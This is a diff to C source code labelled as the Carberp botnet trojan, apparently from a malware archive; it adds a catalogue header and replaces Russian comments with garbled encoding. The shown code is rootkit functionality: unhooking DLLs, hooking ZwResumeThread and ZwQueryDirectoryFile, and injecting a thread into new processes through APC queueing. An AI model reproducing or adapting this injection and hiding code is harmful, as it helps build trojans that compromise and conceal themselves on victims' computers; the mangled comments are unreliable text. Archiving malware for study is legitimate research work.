@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "GetApi.h"
@@ -386,17 +397,17 @@ DWORD GetPidByThread(HANDLE hThread )
 
 VOID NTAPI RootkitThread(	PVOID NormalContext , PVOID SystemArgument1 ,  PVOID SystemArgument2  )
 {
-    // Поток работает в заинжекченном процессе
+    // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	UnhookDlls();
 
 	HookZwResumeThread();	
 	HookZwQueryDirectoryFile();
 
-	// Подготавливаем данные для события
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	TEventData Data;
 	ClearStruct(Data);
 
-	// Определяем имя приложения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR AppName = STR::Alloc(MAX_PATH);
 	if (AppName != NULL && pGetModuleFileNameA(NULL, AppName, MAX_PATH))
 		Data.Application = AppName;
@@ -474,11 +485,11 @@ NTSTATUS WINAPI ZwResumeThreadHook( HANDLE hThread, PULONG PreviousSuspendCount 
 			
 			if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) == STATUS_SUCCESS )
 			{
-				DWORD dwAddr = InjectCode( hProcess, (LPTHREAD_START_ROUTINE) RootkitThread );	//	так делать можно, так как это только получения
+				DWORD dwAddr = InjectCode( hProcess, (LPTHREAD_START_ROUTINE) RootkitThread );	//	пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 				if ( dwAddr != -1 )
 				{
-					if ( (NTSTATUS)pZwQueueApcThread(hThread, dwAddr, NULL, NULL, NULL ) == STATUS_SUCCESS )	//	А тут делаем инжект через АРС 
+					if ( (NTSTATUS)pZwQueueApcThread(hThread, dwAddr, NULL, NULL, NULL ) == STATUS_SUCCESS )	//	пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ 
 						AddPid( dwPid );
 				}
 
